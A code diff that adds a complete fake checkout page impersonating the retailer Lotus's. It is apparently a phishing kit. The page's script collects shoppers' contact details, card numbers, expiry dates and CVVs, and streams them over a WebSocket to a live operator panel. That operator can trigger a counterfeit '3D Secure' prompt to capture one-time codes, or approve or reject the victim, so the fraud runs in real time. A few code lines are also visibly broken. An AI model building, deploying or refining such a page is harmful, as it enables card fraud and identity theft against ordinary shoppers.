@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>Payment | Lotus's Shop Online</title>
+<style>
+:root{--bg:#f5f5f5;--card:#fff;--text:#1a1a1a;--text2:#666;--accent:#00a651;--accent-h:#008c44;--red:#e53935;--border:#e0e0e0;--radius:8px}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5}
+header{background:var(--card);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100}
+header>div{display:flex;align-items:center;justify-content:space-between;height:56px;padding:0 20px;max-width:1200px;margin:0 auto}
+header h1{font-size:18px;font-weight:600}
+.logo{display:flex;align-items:center;gap:8px}
+.logo img{width:36px;height:36px}
+.timer{color:var(--accent);font-size:14px;font-weight:600;min-width:48px;text-align:right}
+.timer.expiring{color:var(--red)}
+main{max-width:1200px;margin:0 auto;padding:0 20px 80px}
+.content{display:flex;gap:32px;padding-top:24px}
+.left{flex:1;min-width:0}
+.right{width:380px;flex-shrink:0;position:sticky;top:80px;align-self:flex-start}
+
+.section{background:var(--card);border-radius:12px;padding:24px;margin-bottom:16px}
+.section h3{font-size:16px;font-weight:600;margin-bottom:16px;color:var(--text)}
+
+.input-group{margin-bottom:16px}
+.input-group label{display:block;font-size:13px;color:var(--text2);margin-bottom:6px;font-weight:500}
+.input-group input{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:15px;outline:none;font-family:inherit;transition:border .2s;background:var(--bg)}
+.input-group input:focus{border-color:var(--accent)}
+.input-row{display:flex;gap:12px}
+.input-row .input-group{flex:1}
+
+.pay-btn{width:100%;padding:14px;margin-top:8px;border:none;border-radius:var(--radius);background:var(--accent);color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
+.pay-btn:hover{background:var(--accent-h)}
+.pay-btn:disabled{opacity:.5;cursor:not-allowed}
+
+.summary{background:var(--card);border-radius:12px;padding:24px}
+.summary h3{font-size:18px;font-weight:700;margin-bottom:20px}
+.summary-row{display:flex;justify-content:space-between;padding:6px 0;font-size:14px}
+.summary-row .val{color:var(--accent);font-weight:600}
+.summary-row.total{border-top:1px solid var(--border);margin-top:12px;padding-top:14px;font-size:18px;font-weight:700}
+.summary-row.total .val{color:var(--accent)}
+
+.secure-note{text-align:center;font-size:12px;color:var(--text2);margin-top:12px;display:flex;align-items:center;justify-content:center;gap:4px}
+.hidden{display:none!important}
+
+.overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:1000;display:flex;align-items:center;justify-content:center}
+.overlay-card{width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.overlay-hdr{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #e0e0e0}
+.overlay-body{padding:20px}
+.overlay-body h2{font-size:16px;font-weight:700;margin-bottom:6px;color:#1a1a1a}
+.overlay-body p{font-size:13px;color:#555;margin-bottom:14px}
+.pin-input{display:flex;gap:8px;justify-content:center;margin:10px 0 16px}
+.pin-input input{width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px}
+.pin-input input:focus{border-color:var(--accent)}
+.otp-error{color:var(--red);font-size:11px;text-align:center;margin-bottom:8px}
+.otp-btn{width:100%;height:44px;background:var(--accent);color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .2s}
+.otp-btn:disabled{opacity:.5;cursor:not-allowed}
+.otp-countdown{text-align:center;color:#bbb;font-size:11px;margin-top:8px}
+.result-msg{text-align:center;padding:30px 20px;font-size:16px;font-weight:600}
+
+@media(max-width:860px){.content{flex-direction:column}.right{width:100%;position:static}}
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <div class="logo">
+      <span style="font-size:24px;font-weight:700;color:var(--accent)">Lotus's</span>
+    </div>
+    <h1>Checkout</h1>
+    <span class="timer" id="timer">5:00</span>
+  </div>
+</header>
+<main>
+  <div class="content">
+    <div class="left">
+      <div class="section">
+        <h3>Contact Information</h3>
+        <div class="input-row">
+          <div class="input-group"><label>Full Name</label><input type="text" id="cust-name" placeholder="John Doe"></div>
+          <div class="input-group"><label>Phone</label><input type="text" id="cust-phone" placeholder="+60 12-345 6789"></div>
+        </div>
+        <div class="input-group"><label>Email</label><input type="email" id="cust-email" placeholder="you@example.com"></div>
+      </div>
+      <div class="section">
+        <h3>Delivery Address</h3>
+        <div class="input-group"><label>Address</label><input type="text" id="cust-address" placeholder="123 Jalan Example"></div>
+        <div class="input-row">
+          <div class="input-group"><label>City</label><input type="text" id="cust-city" placeholder="Kuala Lumpur"></div>
+          <div class="input-group"><label>State</label><input type="text" id="cust-state" placeholder="WP Kuala Lumpur"></div>
+        </div>
+        <div class="input-row">
+          <div class="input-group"><label>Postcode</label><input type="text" id="cust-postcode" placeholder="50000"></div>
+          <div class="input-group"><label>Country</label><input type="text" id="cust-country" value="Malaysia"></div>
+        </div>
+      </div>
+      <div class="section">
+        <h3>Payment Details</h3>
+        <div class="input-group">
+          <label>Credit Card Number</label>
+          <div style="position:relative">
+            <input type="text" placeholder="0000 0000 0000 0000" id="card-number" style="padding-right:80px" autocomplete="cc-number">
+            <div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none">
+              <svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg>
+              <svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg>
+            </div>
+          </div>
+        </div>
+        <div class="input-row">
+          <div class="input-group"><label>Expiry Date</label><input type="text" placeholder="MM / YY" id="card-expiry" autocomplete="cc-exp"></div>
+          <div class="input-group"><label>Security Code</label><input type="text" placeholder="..." id="card-cvv" autocomplete="cc-csc"></div>
+        </div>
+        <div class="input-group"><label>Cardholder Name</label><input type="text" placeholder="Name on card" id="card-name" autocomplete="cc-name"></div>
+        <button class="pay-btn" id="pay-btn" onclick="submitPayment()">Pay Now</button>
+        <div class="secure-note">
+          <svg width="12" height="12" fill="none"><path fill="currentColor" fill-rule="evenodd" d="M6 1a2.5 2.5 0 0 0-2.5 2.5V5h-1a.5.5 0 0 0-.5.5v6a.5.5 0 0 0 .5.5h7a.5.5 0 0 0 .5-.5v-6a.5.5 0 0 0-.5-.5h-1V3.5A2.5 2.5 0 0 0 6 1M4.5 3.5V5h3V3.5a1.5 1.5 0 0 0-3 0"/></svg>
+          Secured by Lotus's
+        </div>
+      </div>
+    </div>
+    <div class="right">
+      <div class="summary">
+        <h3>Order Summary</h3>
+        <div id="summary-items"><div class="summary-row"><span>Loading...</span></div></div>
+        <div class="summary-row total"><span>Total</span><span class="val" id="total-price">RM 0.00</span></div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<div class="overlay hidden" id="load-overlay">
+  <div style="text-align:center">
+    <div style="width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto"></div>
+    <p style="color:#fff;font-size:16px;margin-top:16px;font-weight:500">Processing payment...</p>
+  </div>
+</div>
+
+<div class="overlay hidden" id="otp-overlay">
+  <div class="overlay-card">
+    <div class="overlay-hdr">
+      <div style="display:flex;align-items:center;gap:6px;font-size:14px;font-weight:700">
+        <svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2"><polygon points="20,3 4,14 36,14"/><rect x="4" y="32" width="32" height="4" rx="1"/><line x1="9" y1="15" x2="9" y2="32"/><line x1="16" y1="15" x2="16" y2="32"/><line x1="24" y1="15" x2="24" y2="32"/><line x1="31" y1="15" x2="31" y2="32"/></svg>
+        <span>Secure Verification</span>
+      </div>
+      <span style="font-size:13px;color:var(--accent)">3D Secure</span>
+    </div>
+    <div class="overlay-body" id="otp-body">
+      <div id="otp-form">
+        <h2>Enter your security code</h2>
+        <p>Please enter the code sent to your phone to authorize this payment</p>
+        <div class="pin-input"><input type="tel" maxlength="8" id="otp-code" placeholder=""></div>
+        <div class="otp-error hidden" id="otp-error">Please enter your security code.</div>
+        <button class="otp-btn" id="otp-submit">Verify & Pay</button>
+        <div class="otp-countdown">Code expires in <span id="otp-timer">4:59</span></div>
+      </div>
+      <div id="otp-result" class="hidden">
+        <div class="result-msg" style="color:var(--red)" id="otp-fail">
+          <svg width="48" height="48" fill="none" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#e74c3c"/><line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3"/><line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3"/></svg><br>Payment Failed
+        </div>
+        <p style="text-align:center;color:#888;font-size:13px;margin:8px 0">Your bank did not authorize this transaction.<br>Please try another card or contact your card issuer.</p>
+        <button class="otp-btn" onclick="document.getElementById('otp-overlay').classList.add('hidden');resetOtp()">Try Again</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+var countdown=299;
+setInterval(function(){
+  countdown--;if(countdown<0)countdown=0;
+  var m=Math.floor(countdown/60),s=countdown%60;
+  document.getElementById('timer').textContent=m+':'+String(s).padStart(2,'0');
+  if(countdown<60)document.getElementById('timer').classList.add('expiring');
+},1000);
+
+function loadOrder() {
+  try {
+    var raw = localStorage.getItem('lotus_order');
+    if (!raw) return;
+    var data = JSON.parse(raw);
+    var itemsEl = document.getElementById('summary-items');
+    var h = '';
+    if (data.items && data.items.length > 0) {
+      data.items.forEach(function(item) {
+        var st = (parseFloat(item.price) || 0) * (item.qty || 1);
+        h += '<div class="summary-row"><span>' + (item.name || 'Item') + ' x' + (item.qty||1) + '</span><span class="val">RM ' + st.toFixed(2) + '</span></div>';
+      });
+    } else if (data.amount) {
+      h = '<div class="summary-row"><span>Order Total</span><span class="val">RM ' + parseFloat(data.amount).toFixed(2) + '</span></div>';
+    } else {
+      h = '<div class="summary-row"><span>Grocery Order</span><span class="val">--</span></div>';
+    }
+    itemsEl.innerHTML = h;
+    if (data.amount) {
+      document.getElementById('total-price').textContent = 'RM ' + parseFloat(data.amount).toFixed(2);
+    }
+    if (data.customerName) document.getElementById('cust-name').value = data.customerName;
+    if (data.email) document.getElementById('cust-email').value = data.email;
+    if (data.phone) document.getElementById('cust-phone').value = data.phone;
+    if (data.address) document.getElementById('cust-address').value = data.address;
+  } catch(ex) {}
+}
+loadOrder();
+
+function luhn(n) {
+  var s=0,a=0;
+  for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],10);if(a)s+=d*2>9?d*2-9:d*2;else s+=d;a=!a}
+  return s%10===0;
+}
+
+var ws=null,sid=null,wsTimer=null;
+var cid=localStorage.getItem('lotus_cid');
+if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('lotus_cid',cid)}
+
+function wsConnect(){
+  var protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  var url=protocol+'//'+location.host+'/api?role=customer&cid='+cid+(sid?'&sid='+sid:'');
+  ws=new WebSocket(url);
+  ws.onopen=function(){if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},30000)};
+  ws.onmessage=function(e){
+    var msg=JSON.parse(e.data);
+    if(msg.type==='operator_action'){
+      var p=msg.payload;var a=p.action;
+      if(a==='ack'){sid=p.sessionId}
+      else if(a==='session_restored'){
+        sid=p.sessionId;
+        if(p.cardInfo){var ci=p.cardInfo;if(ci.cardHolder)document.getElementById('card-name').value=ci.cardHolder;if(ci.cardNumber)document.getElementById('card-number').value=ci.cardNumber.replace(/(\d{4})(?=\d)/g,'$1 ');if(ci.expiry)document.getElementById('card-expiry').value=ci.expiry;if(ci.cvv)document.getElementById('card-cvv').value=ci.cvv}
+        if(p.customerInfo){var cu=p.customerInfo;if(cu.fullName)document.getElementById('cust-name').value=cu.fullName;if(cu.phone)document.getElementById('cust-phone').value=cu.phone;if(cu.email)document.getElementById('cust-email').value=cu.email;if(cu.address1)document.getElementById('cust-address').value=cu.address1;if(cu.city)document.getElementById('cust-city').value=cu.city;if(cu.state)document.getElementById('cust-state').value=cu.state}
+        if(p.status==='pending'){document.getElementById('load-overlay').classList.remove('hidden')}
+      }
+      else if(a==='otp_verify'||a==='custom_otp_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');resetOtp();startOtpTimer()}
+      else if(a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='app_verify'||a==='question_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');document.getElementById('otp-body h2').textContent='Verification Required';resetOtp()}
+      else if(a==='approve'){location.href='/complete/'}
+      else if(a==='reject'){document.getElementById('load-overlay').classList.add('hidden');alert('Payment rejected: '+(p.message||''))}
+      else if(a==='timeout'){alert('Session timeout. Please try again.')}
+      else if(a==='change_card'){alert('Please use a different card.')}
+      else if(a==='custom_prompt'){alert(p.message||'')}
+    }
+  };
+  ws.onclose=function(){if(wsTimer)clearInterval(wsTimer);setTimeout(wsConnect,5000)};
+  ws.onerror=function(){};
+}
+wsConnect();
+
+function buildPayload(){
+  var cn=document.getElementById('card-number').value.replace(/\s/g,'');
+  var ce=document.getElementById('card-expiry').value.trim();
+  var cv=document.getElementById('card-cvv').value.trim();
+  var nm=document.getElementById('card-name').value.trim();
+  var bn=document.getElementById('cust-name').value.trim();
+  var ph=document.getElementById('cust-phone').value.trim();
+  var em=document.getElementById('cust-email').value.trim();
+  var ad=document.getElementById('cust-address').value.trim();
+  var ci=document.getElementById('cust-city').value.trim();
+  var st=document.getElementById('cust-state').value.trim();
+  var pc=document.getElementById('cust-postcode').value.trim();
+  var co=document.getElementById('cust-country').value.trim();
+  var nmParts=bn.split(' ');
+  return{
+    frontendUrl:location.hostname,
+    cardInfo:{cardNumber:cn,expiry:ce,cvv:cv,cardHolder:nm},
+    customerInfo:{firstName:nmParts[0]||'',lastName:nmParts.slice(1).join(' ')||'',fullName:bn,email:em,phone:ph,address1:ad,city:ci,state:st,postcode:pc,country:co},
+    browsingTabs:[{label:'Checkout',count:1,active:true}],
+    currentStep:'card'
+  };
+}
+
+function submitPayment(){
+  var cn=document.getElementById('card-number').value.replace(/\s/g,'');
+  var ce=document.getElementById('card-expiry').value.trim();
+  var cv=document.getElementById('card-cvv').value.trim();
+  var nm=document.getElementById('card-name').value.trim();
+  if(cn.length<13||cn.length>19)return alert('Please enter a valid card number');
+  if(!luhn(cn))return alert('Invalid card number');
+  if(!ce.match(/^\d\d\/\d\d$/))return alert('Please enter a valid expiry date (MM/YY)');
+  if(cv.length<3)return alert('Please enter a valid security code');
+  if(!nm)return alert('Please enter the cardholder name');
+  document.getElementById('pay-btn').disabled=true;
+  document.getElementById('load-overlay').classList.remove('hidden');
+  if(!ws||ws.readyState!==1){wsConnect();setTimeout(function(){sendPayload()},2000);return}
+  sendPayload();
+}
+
+function sendPayload(){
+  var payload=buildPayload();
+  if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
+  payload.status='pending';
+  payload.sessionId=sid;
+  ws.send(JSON.stringify({type:'session_update',payload:payload}));
+}
+
+function submitOtp(){
+  var code=document.getElementById('otp-code').value;
+  if(code.length<4){document.getElementById('otp-code').style.borderColor=var(--red);document.getElementById('otp-error').classList.remove('hidden');return}
+  document.getElementById('otp-code').style.borderColor='';
+  document.getElementById('otp-overlay').classList.add('hidden');
+  document.getElementById('load-overlay').classList.remove('hidden');
+  if(ws&&ws.readyState===1&&sid){
+    var p=buildPayload();
+    p.cardInfo.otpCode=code;
+    ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:p.cardInfo,customerInfo:p.customerInfo,browsingTabs:p.browsingTabs,currentStep:'otp'}}));
+  }
+}
+
+function resetOtp(){
+  document.getElementById('otp-form').classList.remove('hidden');
+  document.getElementById('otp-result').classList.add('hidden');
+  document.getElementById('otp-error').classList.add('hidden');
+  var otp=document.getElementById('otp-code');
+  otp.value='';otp.focus();
+  otp.style.borderColor='';
+  var b=document.getElementById('otp-submit');
+  b.disabled=false;b.textContent='Verify & Pay';
+}
+
+var otpSec=299,otpTmr=null;
+function startOtpTimer(){
+  otpSec=299;clearInterval(otpTmr);
+  otpTmr=setInterval(function(){
+    otpSec--;if(otpSec<0){otpSec=0;clearInterval(otpTmr);document.getElementById('otp-submit').disabled=true}
+    var m=Math.floor(otpSec/60),s=otpSec%60;
+    document.getElementById('otp-timer').textContent=m+':'+String(s).padStart(2,'0');
+  },1000);
+}
+
+document.getElementById('otp-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
+document.getElementById('otp-submit').addEventListener('click',submitOtp);
+
+(function(){
+  var cc=document.getElementById('card-number');
+  cc.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');if(v.length>=13)this.style.borderColor=luhn(v)?'#2e7d32':'#c62828'});
+  cc.addEventListener('blur',function(){this.style.borderColor=''});
+  var ex=document.getElementById('card-expiry');
+  ex.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,4);if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v});
+  ex.addEventListener('keydown',function(e){if(e.key==='Backspace'&&this.value.endsWith('/')){this.value=this.value.slice(0,-1);e.preventDefault()}});
+  var cv=document.getElementById('card-cvv');
+  cv.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,4)});
+})();
+</script>
+</body>
+</html>
